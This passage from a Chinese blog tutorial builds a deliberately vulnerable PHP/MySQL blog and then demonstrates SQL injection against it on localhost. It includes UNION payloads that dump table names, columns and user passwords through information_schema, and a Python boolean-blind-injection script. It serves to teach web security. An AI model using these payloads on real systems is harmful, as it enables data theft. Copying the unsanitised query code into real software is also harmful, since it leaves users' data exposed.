<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Charmersix_blog系统登录<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Charmersix_blog系统登录<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;login.php&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">          账户:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">          密码:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;登录&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>         </span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210091431722.png" alt="image-20221009143140691"></p>
<h4 id="建立登录验证功能"><a href="#建立登录验证功能" class="headerlink" title="建立登录验证功能"></a>建立登录验证功能</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;conn.php&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username from user where username = &#x27;<span class="subst">$username</span>&#x27; and password = &#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>); <span class="comment">//sql语句传进去,和数据库交互</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_BOTH))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将交互结果反馈出来</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;登录成功,欢迎&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;LOGIN&#x27;</span>]=<span class="literal">true</span>;</span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">    &lt;a href=&quot;index.html&quot; style=&quot;color: tomato&quot;&gt;首页&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;a href=&quot;page_list.php&quot; style=&quot;color: tomato&quot;&gt;文章列表&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;a href=&quot;page_add.php&quot; style=&quot;color: tomato&quot;&gt;新增内容&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;a href=&quot;page_logout.php&quot; style=&quot;color: tomato&quot;&gt;退出登录&lt;/a&gt;</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;登录失败&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br></pre></td></tr></table></figure>

<h4 id="增加文章录入功能"><a href="#增加文章录入功能" class="headerlink" title="增加文章录入功能"></a>增加文章录入功能</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;conn.php&quot;;</span><br><span class="line"></span><br><span class="line">$title = $_POST[&#x27;title&#x27;];</span><br><span class="line">$content = $_POST[&#x27;content&#x27;];</span><br><span class="line">if(isset($title)&amp;&amp;isset($content))&#123;</span><br><span class="line">    //以免插入空内容</span><br><span class="line">    $sql = &quot;insert into page (title,content) values(&#x27;$title&#x27;,&#x27;$content&#x27;)&quot;;</span><br><span class="line">    $result = $conn-&gt;query($sql);</span><br><span class="line">    if($result)&#123;</span><br><span class="line">        echo &quot;插入成功&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;插入失败&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> $conn-&gt;close();</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Charmersix_blog文章录入&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">      &lt;center&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">          &lt;h1&gt;Charmersix_blog文章录入&lt;/h1&gt;</span><br><span class="line">        &lt;hr&gt;</span><br><span class="line">        &lt;form action=&quot;login.php&quot; enctype=&quot;application/x-www-form-urlencoded&quot; method=&quot;post&quot;&gt;</span><br><span class="line">          账户:&lt;input type=&quot;text&quot; name=&quot;title&quot;&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">          密码:&lt;input type=&quot;text&quot; name=&quot;content&quot;&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">          &lt;br&gt;</span><br><span class="line">          &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;br&gt;&lt;br&gt;         </span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">      &lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="增加文章内容列表"><a href="#增加文章内容列表" class="headerlink" title="增加文章内容列表"></a>增加文章内容列表</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;conn.php&quot;;</span><br><span class="line">$sql = &quot;select id,title,content from page&quot;;</span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line">if ($result)&#123;</span><br><span class="line">    $list = $result-&gt;fetch_all(MYSQLI_BOTH);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Charmersix_blog内容列表&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">      &lt;center&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">         &lt;h1 style=&quot;color: #ffb8e5&quot;&gt;Charmersix_blog内容列表&lt;/h1&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line">        foreach ($list as $p)&#123;</span><br><span class="line">        ?&gt;</span><br><span class="line">            &lt;li&gt;</span><br><span class="line">                &lt;a href=&quot;page_detail.php?id=&lt;?=$p[&#x27;id&#x27;]; ?&gt;&quot;&gt;</span><br><span class="line">                    &lt;?=$p[&#x27;title&#x27;]; ?&gt;</span><br><span class="line">                &lt;/a&gt;</span><br><span class="line">                &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;</span><br><span class="line">                &lt;a href=&quot;page_detail.php?id=&lt;?=$p[&#x27;id&#x27;]; ?&gt;&quot;&gt;查看&lt;/a&gt;</span><br><span class="line">                &lt;a href=&quot;page_edit.php?id=&lt;?=$p[&#x27;id&#x27;]; ?&gt;&quot;&gt; | 修改&lt;/a&gt;</span><br><span class="line">                &lt;a href=&quot;page_delete.php?id=&lt;?=$p[&#x27;id&#x27;]; ?&gt;&quot;&gt; | 删除&lt;/a&gt;</span><br><span class="line">            &lt;/li&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line">        &#125;</span><br><span class="line">        ?&gt;</span><br><span class="line">     &lt;/ul&gt;</span><br><span class="line">      &lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="显示文章详情"><a href="#显示文章详情" class="headerlink" title="显示文章详情"></a>显示文章详情</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;conn.php&quot;;</span><br><span class="line">$id = $_GET[&#x27;id&#x27;]?$_GET[&#x27;id&#x27;]:1;</span><br><span class="line">$sql = &quot;select id,title,content from page where id = $id&quot;;</span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line">if($result)&#123;</span><br><span class="line">    $page = $result-&gt;fetch_array(MYSQLI_BOTH);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;&lt;?=$page[&#x27;title&#x27;];?&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">    &lt;h1 style=&quot;color: #ffb8e5&quot;&gt;&lt;?=$page[&#x27;title&#x27;];?&gt;&lt;/h1&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;p style=&quot;color: #ffb8e5&quot;&gt;</span><br><span class="line">        &lt;?=$page[&#x27;content&#x27;];?&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="增加文章编辑功能"><a href="#增加文章编辑功能" class="headerlink" title="增加文章编辑功能"></a>增加文章编辑功能</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;conn.php&quot;;</span><br><span class="line">$action = $_GET[&#x27;action&#x27;];</span><br><span class="line">if($action ==&quot;edit&quot;)&#123;</span><br><span class="line">    $id = $_GET[&#x27;id&#x27;];</span><br><span class="line">    $title = $_POST[&#x27;title&#x27;];</span><br><span class="line">    $content =$_POST[&#x27;content&#x27;];</span><br><span class="line"></span><br><span class="line">    $sql = &quot;update page set title = &#x27;$title&#x27;, content = &#x27;$content&#x27; where id =$id&quot;;</span><br><span class="line">    $result = $conn-&gt;query($sql);</span><br><span class="line">    if($result)&#123;</span><br><span class="line">        echo &quot;修改成功&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;修改失败&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    header(&quot;location:page_edit.php?id=$id&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $id = $_GET[&#x27;id&#x27;];</span><br><span class="line">    if(!isset($id))</span><br><span class="line">    &#123;</span><br><span class="line">        die(&quot;id不存在，不能修改&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $sql = &quot;select id,title,content from page where id=$id&quot;;</span><br><span class="line">    $result = $conn-&gt;query($sql);</span><br><span class="line">    if($result)&#123;</span><br><span class="line">        $page = $result-&gt;fetch_array(MYSQLI_BOTH);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Charmersix_blog内容修改&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">    &lt;h1 style=&quot;color: #ffb8e5&quot;&gt;Charmersix_blog内容修改&lt;/h1&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;form action=&quot;page_edit.php?action=edit&amp;id=&lt;?=$page[&#x27;id&#x27;];?&gt;&quot; enctype=&quot;application/x-www-form-urlencoded&quot; method=&quot;post&quot; &gt;</span><br><span class="line"></span><br><span class="line">        标题:&lt;input type=&quot;text&quot; name=&quot;title&quot; style=&quot;background: rgba(255,255,255,0.5);color: rgba(255,255,255,1);width:200px&quot; value=&quot;&lt;?=$page[&#x27;title&#x27;];?&gt;&quot;&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        内容:&lt;input type=&quot;text&quot; name=&quot;content&quot;style=&quot;background: rgba(255,255,255,0.5);color: rgba(255,255,255,1);width:200px;height: 250px&quot; value=&quot;&lt;?=$page[&#x27;content&#x27;];?&gt;&quot;&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;修改&quot;style=&quot;background: rgba(255,255,255,0.5);color: rgba(255,255,255,1)&quot;&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$conn-&gt;close();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="增加删除功能"><a href="#增加删除功能" class="headerlink" title="增加删除功能"></a>增加删除功能</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;conn.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$id</span>))&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;delete from page where id =<span class="subst">$id</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;删除成功&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;id不存在，无法删除&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="增加连接-提升可用性"><a href="#增加连接-提升可用性" class="headerlink" title="增加连接,提升可用性"></a>增加连接,提升可用性</h4><p>我们加几个<code>&lt;a&gt;</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;index.html&quot;</span> <span class="attr">style</span>=<span class="string">&quot;color: tomato&quot;</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;page_list.php&quot;</span> <span class="attr">style</span>=<span class="string">&quot;color: tomato&quot;</span>&gt;</span>文章列表<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;page_add.php&quot;</span> <span class="attr">style</span>=<span class="string">&quot;color: tomato&quot;</span>&gt;</span>新增内容<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;page_logout.php&quot;</span> <span class="attr">style</span>=<span class="string">&quot;color: tomato&quot;</span>&gt;</span>退出登录<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="设置权限"><a href="#设置权限" class="headerlink" title="设置权限"></a>设置权限</h4><p>加个check.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$_SESSION</span>[<span class="string">&#x27;LOGIN&#x27;</span>])&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.html&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="增加退出功能"><a href="#增加退出功能" class="headerlink" title="增加退出功能"></a>增加退出功能</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="0x3-总结"><a href="#0x3-总结" class="headerlink" title="0x3 总结"></a>0x3 总结</h3><h4 id="SQL语句"><a href="#SQL语句" class="headerlink" title="SQL语句"></a>SQL语句</h4><p>sql语句对数据库的增删改查，一般使用</p>
<ul>
<li><code>select id,username,passw from user;</code></li>
<li><code>update page set title = &#39;page1&#39;,content=&#39;content1&#39; where id = 1;</code></li>
<li><code>delete from page where id = 1;</code></li>
<li><code>insert into page (title,content) values(&#39;page&#39;,&#39;content&#39;);</code></li>
</ul>
<h4 id="PHP语句"><a href="#PHP语句" class="headerlink" title="PHP语句"></a>PHP语句</h4><ul>
<li><p><code>conn = new mysqli()</code></p>
<p>连接数据库</p>
</li>
<li><p><code>conn-&gt;query()</code></p>
</li>
<li><p><code>result-&gt;fetch_all()</code></p>
</li>
<li><p><code>result-&gt;fetch_array()</code></p>
<p>多个用fetch_all()</p>
</li>
</ul>
<h2 id="第二节-sql注入"><a href="#第二节-sql注入" class="headerlink" title="第二节 sql注入"></a>第二节 sql注入</h2><h3 id="0x4-sql注入产生"><a href="#0x4-sql注入产生" class="headerlink" title="0x4 sql注入产生"></a>0x4 sql注入产生</h3><p>动态页面中，get或者post提交参数，这个参数进入到了sql语句进行了数据库查询</p>
<p>简言之:非可信字符直接拼接进sql语句进行数据查询,就会造成sql注入</p>
<h3 id="0x5-sql注入的危害"><a href="#0x5-sql注入的危害" class="headerlink" title="0x5 sql注入的危害"></a>0x5 sql注入的危害</h3><ul>
<li>歪曲sql语句的查询结果</li>
<li>泄露数据库中的敏感数据</li>
<li>干扰查询结果绕过权限检查</li>
<li>通过文件操作写入恶意代码</li>
</ul>
<h3 id="0x6-sql注入类型"><a href="#0x6-sql注入类型" class="headerlink" title="0x6 sql注入类型"></a>0x6 sql注入类型</h3><h4 id="数字型注入和union联合注入"><a href="#数字型注入和union联合注入" class="headerlink" title="数字型注入和union联合注入"></a>数字型注入和union联合注入</h4><h5 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h5><p><code>http://127.0.0.1/page_detail.php?id=1%2b2</code></p>
<p><code>http://127.0.0.1/page_detail.php?id=2-1</code></p>
<p>如果可以查询到id=3和1的数据,就可以说明这里存在数字型注入,就可以与union联合注入相结合</p>
<h5 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入"></a>union联合注入</h5><p><code>select id,title,content from page union select id,username,password from user;</code><br>我们可以看到</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210132127045.png" alt="image-20221013212734008"></p>
<p>同理我们回到我们网站<code>http://127.0.0.1/page_detail.php?id=1 union select id,username,password from user;</code></p>
<p>很遗憾这里没有显示出我们想要的数据</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210132130889.png" alt="image-20221013213004675"></p>
<p>因为在网页中这里只能显示出两条数据,我们可以加个<code>limit</code>来限制显示的哪两条数据</p>
<p>比如这里<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210132134877.png" alt="image-20221013213433660"></p>
<p>就可以展现出我们想要的数据</p>
<p>当然我们也可以使用<code>group_concat</code>将所有的数据写入到一行输出</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210141939423.png" alt="image-20221014193934137"></p>
<p>那么问题又来了,如果我们不知道列名,表名甚至连几列都不知道,这时候我们可以用个<code>order by</code></p>
<p>我们使用<code>http://127.0.0.1/page_detail.php?id=1 order by 1</code></p>
<p>从1开始增加,一直增加到4</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210132152927.png" alt="image-20221013215217718"></p>
<p>这时候没有回显了,就可以说明我们这个数据表有四列</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210132158169.png" alt="image-20221013215800131"></p>
<p>那么我们怎么得到表名呢?在我们的MySQL里边有一个数据表是专门用来存表名的,在我们的information_schema里有一个TABLES,里面存着所有表的名字,在最后我们可以找到我们数据表的名字<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210141909287.png" alt="image-20221014190933162"></p>
<p>那么怎么查这个表名呢,我们可以这样</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210142212588.png" alt="image-20221014221255500"></p>
<p>同理，我们回到我们的web页面 payload：<code>1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 limit 1,1</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210142215463.png" alt="image-20221014221504185"></p>
<p>问题继续产生,怎么查询我们的列名呢 payload：<code> 1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;user&#39;),3 limit 1,1</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210142230449.png" alt="image-20221014223007215"></p>
<p>这样我们就可以拿到我们列名，就可以按照最开始的查询语句来查询我们想要的数据</p>
<p>附上一张我们的结构图，方便查询我们需要的表名，列名</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210142234339.png" alt="sql"></p>
<h4 id="字符型注入和布尔盲注"><a href="#字符型注入和布尔盲注" class="headerlink" title="字符型注入和布尔盲注"></a>字符型注入和布尔盲注</h4><h5 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h5><p>字符型注入和数字型注入最大的区别就是引号的包裹,我们修改下我们的<code>page_detail.php</code>中的<code>id</code>参数</p>
<p>改为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,title,content from page where id = &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>那么我们怎么来判断是字符型注入呢</p>
<p>首先我们看一下<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210152148473.png" alt="image-20221015214844187"></p>
<p>然后看一下<code>1a</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210152149113.png" alt="image-20221015214929873"></p>
<p>但是如果我们源码里是数字型的话,这边应该是没有任何数据返回的<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210152234867.png" alt="image-20221015223444594"></p>
<p>这里我们会发现着两组数据是一样的,接下来我们看<code>a1</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210152150209.png" alt="image-20221015215021975"></p>
<p>这时候我们会发现并没有任何回显,那么这是为什么呢,我们来到MySQL试一下<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210152153414.png" alt="image-20221015215335376"></p>
<p>字符串转为数字后是拿第一位来判断,如果第一位是数字,那么字符串就是数字如果是字母,那么<code>1=a</code>显然不对,返回0</p>
<p>字符型SQL注入重点就是要闭合单引号或者双引号</p>
<h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p>当我们没有明显的回显点,只能得到两种结果,比如页面报错/页面没报错,这时候,我们可以用布尔盲注来猜</p>
<ul>
<li>当我们猜对的时候,页面没有报错</li>
<li>当我们猜错的时候,页面报错</li>
</ul>
<p>基于这个原理,我们能够通过发送大量请求,来猜出所有的数据</p>
<p>这里我们可以拿login.php来试一下,这里我们需要用一个<code>or</code>,在SQL中,<code>or</code>前后只要成立一条命令,该命令就成立;我们还需要用到一个<code>substr()</code>,用于截取对应字段的指定长度</p>
<blockquote>
<p>SUBSTR(string ,pos,len)</p>
<p>string:指定字符串</p>
<p>pos:规定字符串从何处开始，（这里的第一个位置是1而不是0）为正数时则从字段开始出开始，为负数则从结尾出开始。</p>
<p>len:要截取字符串的长度。（是从1开始计数而不是0）</p>
</blockquote>
<p>比如<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210162212920.png" alt="image-20221016221249867"></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210162212149.png" alt="image-20221016221227095"></p>
<p>基于这个道理,我么就可以判断出用户第一位是<code>a</code>,我们也就可以写一个bool盲注的脚本,来猜出我们的用户名</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/login.php&quot;</span></span><br><span class="line"></span><br><span class="line">users = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">user = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> u <span class="keyword">in</span> users:</span><br><span class="line">        data=&#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>:<span class="string">&quot;123&#x27; or substr(username,&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; and id = 1#&quot;</span>.<span class="built_in">format</span>(i,u),</span><br><span class="line">         <span class="comment">#这里的井号可以换成--空格,来注释掉后边的语句,有些版本也可以用--A </span></span><br><span class="line">        <span class="string">&quot;password&quot;</span>:<span class="string">&quot;123&quot;</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;page_list.php&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            user += u</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在盲注第&#123;&#125;位&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;用户名为:&quot;</span>+user)</span><br></pre></td></tr></table></figure>

